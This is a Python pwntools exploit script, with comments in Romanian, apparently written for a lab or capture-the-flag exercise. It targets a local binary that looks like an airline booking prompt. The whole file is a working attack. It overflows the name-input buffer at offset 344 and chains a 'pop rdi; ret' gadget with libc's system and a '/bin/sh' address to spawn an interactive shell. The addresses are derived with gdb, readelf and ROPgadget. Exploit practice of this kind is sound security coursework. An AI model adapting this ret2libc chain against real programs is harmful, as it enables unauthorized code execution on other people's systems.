#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./bin/ex1', checksec=False)
context.log_level = 'debug'

# ================== CONFIG DIN GDB + READELF ==================

# din gdb: p system
SYSTEM_RUNTIME = 0x7ffff7dff110

# din gdb: find &system, +9999999, "/bin/sh"
BINSH = 0x7ffff7f53ea4

# din readelf -s libc.so.6 | grep " system@"
SYSTEM_OFFSET  = 0x0000000000053110  # <-- AICI pui ce-ți dă readelf, exemplu!

# din ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
POP_RDI_OFFSET = 0x000000000002a145  # ăsta îl știi deja

# calcule runtime
LIBC_BASE   = SYSTEM_RUNTIME - SYSTEM_OFFSET
SYSTEM      = SYSTEM_RUNTIME
POP_RDI_RET = LIBC_BASE + POP_RDI_OFFSET

log.info(f"LIBC_BASE   = {hex(LIBC_BASE)}")
log.info(f"SYSTEM      = {hex(SYSTEM)}")
log.info(f"BINSH       = {hex(BINSH)}")
log.info(f"POP_RDI_RET = {hex(POP_RDI_RET)}")

# offset până la RIP (cum ai calculat tu: 4*64 + 64 + padding + RBP)
OFFSET = 344

# ================== PAYLOAD ==================

def build_payload():
    payload  = b"A" * OFFSET
    payload += p64(POP_RDI_RET)  # pop rdi ; ret
    payload += p64(BINSH)        # RDI = &"/bin/sh"
    payload += p64(SYSTEM)       # ret -> system("/bin/sh")
    return payload

def main():
    io = process('./bin/ex1')

    # Programul:
    # 1) afișează lista de companii
    # 2) citește index
    # 3) cere nume (aici overflow)

    # Trimitem un index valid (0..3)
    io.sendlineafter(b"Select an airline:", b"0")

    # Acum citim numele și dăm overflow peste return address
    io.sendlineafter(b"Please input your name to check your booking:", build_payload())

    # Dacă totul e ok -> shell
    io.interactive()

if __name__ == "__main__":
    main()
